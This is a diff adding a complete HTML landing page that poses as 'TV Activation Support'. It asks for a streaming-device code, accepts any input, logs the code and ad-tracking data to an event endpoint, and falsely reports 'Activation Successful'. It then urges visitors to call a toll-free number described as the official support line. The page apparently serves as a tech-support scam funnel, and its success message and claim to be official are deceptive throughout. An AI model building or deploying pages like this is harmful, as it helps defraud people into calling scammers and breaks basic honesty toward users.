@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>TV Activation Support | Enter Your Code</title>
+<meta name="description" content="Enter the activation code shown on your TV screen to start watching your favorite content.">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;min-height:100vh}
+body{
+  background:#eef2f7;
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+  display:flex;flex-direction:column;align-items:center;
+  justify-content:flex-start;
+  padding:40px 16px 120px;
+  min-height:100vh;
+}
+
+/* ── CARD ── */
+.card{
+  background:#fff;
+  border-radius:16px;
+  padding:32px 24px;
+  width:100%;
+  max-width:440px;
+  box-shadow:0 4px 24px rgba(0,0,0,0.08);
+}
+
+/* ── SCREEN 1: Code entry ── */
+#screen1{}
+.card-title{font-size:1.3rem;font-weight:800;color:#0d1117;margin-bottom:10px;line-height:1.3}
+.card-sub{font-size:0.9rem;color:#64748b;line-height:1.55;margin-bottom:24px}
+#codeInput{
+  width:100%;padding:15px 18px;
+  font-size:1rem;color:#0d1117;
+  border:1.5px solid #dde3ea;border-radius:10px;
+  outline:none;background:#fff;
+  transition:border-color 0.2s;
+  letter-spacing:1px;
+}
+#codeInput:focus{border-color:#1d7cf2}
+#codeInput::placeholder{color:#b0bac6;font-weight:400;letter-spacing:0}
+.error-msg{display:none;color:#e53e3e;font-size:0.8rem;margin-top:6px}
+.error-msg.show{display:block}
+.activate-btn{
+  width:100%;margin-top:16px;
+  padding:16px;
+  background:#1d7cf2;color:#fff;
+  border:none;border-radius:10px;
+  font-size:1rem;font-weight:700;
+  cursor:pointer;letter-spacing:0.2px;
+  transition:background 0.15s;
+}
+.activate-btn:hover{background:#1a6fdb}
+.activate-btn:active{background:#155ab5}
+
+.how-box{
+  background:#f7f9fc;border-radius:10px;
+  padding:18px 18px;margin-top:22px;
+}
+.how-title{font-size:0.9rem;font-weight:700;color:#0d1117;margin-bottom:12px}
+.how-list{list-style:disc;padding-left:18px;display:flex;flex-direction:column;gap:8px}
+.how-list li{font-size:0.84rem;color:#4a5568;line-height:1.45}
+.how-list li strong{color:#0d1117}
+
+.card-footer{text-align:center;margin-top:22px;font-size:0.74rem;color:#a0aec0}
+
+/* ── SCREEN 2: Success ── */
+#screen2{display:none}
+.success-badge{
+  display:inline-block;
+  background:#e6f9f0;color:#16a34a;
+  font-size:0.78rem;font-weight:700;
+  padding:5px 14px;border-radius:20px;
+  margin-bottom:16px;letter-spacing:0.3px;
+}
+.success-title{font-size:2rem;font-weight:900;color:#16a34a;text-align:center;margin-bottom:8px}
+.success-sub{font-size:1rem;font-weight:700;color:#0d1117;text-align:center;margin-bottom:12px;line-height:1.35}
+.success-next{font-size:0.92rem;font-weight:600;color:#1d7cf2;text-align:center;margin-bottom:24px;line-height:1.45}
+.call-btn{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  width:100%;background:#1d4ed8;color:#fff;
+  text-decoration:none;border-radius:10px;
+  padding:16px 20px;
+  transition:background 0.15s;margin-bottom:12px;
+}
+.call-btn:hover{background:#1e40af}
+.call-btn-main{display:flex;align-items:center;gap:8px;font-size:1.1rem;font-weight:800}
+.call-btn-main svg{width:20px;height:20px;fill:#fff;flex-shrink:0}
+.call-btn-sub{font-size:0.78rem;color:rgba(255,255,255,0.75);margin-top:3px}
+.success-note{font-size:0.8rem;color:#94a3b8;text-align:center;margin-top:4px;line-height:1.5}
+
+/* ── STICKY BOTTOM BAR ── */
+.sticky-bar{
+  position:fixed;bottom:0;left:0;right:0;
+  background:#0d1117;
+  padding:14px 16px 18px;
+  z-index:999;
+}
+.sticky-bar-label{font-size:0.78rem;font-weight:600;color:#fff;text-align:center;margin-bottom:8px}
+.sticky-bar-btn{
+  display:block;width:100%;max-width:440px;margin:0 auto;
+  background:#16a34a;color:#fff;
+  text-decoration:none;text-align:center;
+  font-size:1rem;font-weight:800;
+  padding:13px;border-radius:8px;
+  transition:background 0.15s;letter-spacing:0.3px;
+}
+.sticky-bar-btn:hover{background:#15803d}
+
+/* ── CENTER CARD CONTENT ── */
+#screen2{text-align:center}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- SCREEN 1: Enter code -->
+  <div id="screen1">
+    <div class="card-title">Enter the code displayed on your TV screen!</div>
+    <div class="card-sub">Enter the activation code shown on your TV or streaming device to start watching your favorite content.</div>
+
+    <input type="text" id="codeInput" placeholder="e.g. ABCD-1234" maxlength="12" autocomplete="off" autocorrect="off" autocapitalize="characters" spellcheck="false">
+    <div class="error-msg" id="errorMsg">Please enter a valid code (4+ characters).</div>
+    <button class="activate-btn" onclick="handleSubmit()">Activate Now</button>
+
+    <div class="how-box">
+      <div class="how-title">How to find your activation code:</div>
+      <ul class="how-list">
+        <li>Open your streaming app</li>
+        <li>Go to <strong>Sign In</strong> or <strong>Activate on TV</strong></li>
+        <li>Look for a 6–8 character code on your screen</li>
+        <li>Enter that code here and tap "Activate Now"</li>
+      </ul>
+    </div>
+
+    <div class="card-footer">© 2026 TV Activation Support</div>
+  </div>
+
+  <!-- SCREEN 2: Success + call -->
+  <div id="screen2">
+    <div class="success-badge">Activation Successful</div>
+    <div class="success-title">Success!</div>
+    <div class="success-sub">Your code has been activated successfully</div>
+    <div class="success-next">Next step: Call or chat with support to complete your device activation</div>
+
+    <a class="call-btn" href="tel:+18887791904" id="callBtn">
+      <div class="call-btn-main">
+        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+        Call Now +1 888 779 1904
+      </div>
+      <div class="call-btn-sub">Official activation support line</div>
+    </a>
+
+    <div class="success-note">Please keep your device ready while connecting to support</div>
+  </div>
+
+</div>
+
+<!-- STICKY BOTTOM BAR -->
+<div class="sticky-bar">
+  <div class="sticky-bar-label">For Any Live Human Technical Support, Call Directly</div>
+  <a class="sticky-bar-btn" href="tel:+18887791904" id="stickyCallBtn">+1 888 779 1904</a>
+</div>
+
+<script>
+var p = new URLSearchParams(window.location.search);
+
+document.getElementById('codeInput').addEventListener('input', function(){
+  this.value = this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');
+});
+document.getElementById('codeInput').addEventListener('keydown', function(e){
+  if(e.key === 'Enter') handleSubmit();
+});
+
+function handleSubmit(){
+  var code = document.getElementById('codeInput').value.trim();
+  var err = document.getElementById('errorMsg');
+  if(code.length < 4){ err.classList.add('show'); document.getElementById('codeInput').focus(); return; }
+  err.classList.remove('show');
+
+  try{
+    fetch('/api/v1/event',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        type:'code_submit', code:code, channel:p.get('ch')||'tv',
+        sw:screen.width, sh:screen.height,
+        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer:document.referrer,
+        utm_source:p.get('utm_source')||'',
+        utm_campaign:p.get('utm_campaign')||'',
+        utm_term:p.get('utm_term')||'',
+        gclid:p.get('gclid')||''
+      })
+    }).catch(function(){});
+  }catch(e){}
+
+  document.getElementById('screen1').style.display = 'none';
+  document.getElementById('screen2').style.display = 'block';
+}
+
+document.getElementById('callBtn').addEventListener('click', function(){
+  try{
+    fetch('/api/v1/event',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({type:'call_click', channel:p.get('ch')||'tv', code:document.getElementById('codeInput').value.trim(), gclid:p.get('gclid')||'', utm_campaign:p.get('utm_campaign')||''})
+    }).catch(function(){});
+  }catch(e){}
+});
+document.getElementById('stickyCallBtn').addEventListener('click', function(){
+  try{
+    fetch('/api/v1/event',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({type:'call_click', channel:p.get('ch')||'tv-sticky', code:'', gclid:p.get('gclid')||'', utm_campaign:p.get('utm_campaign')||''})
+    }).catch(function(){});
+  }catch(e){}
+});
+</script>
+</body>
+</html>
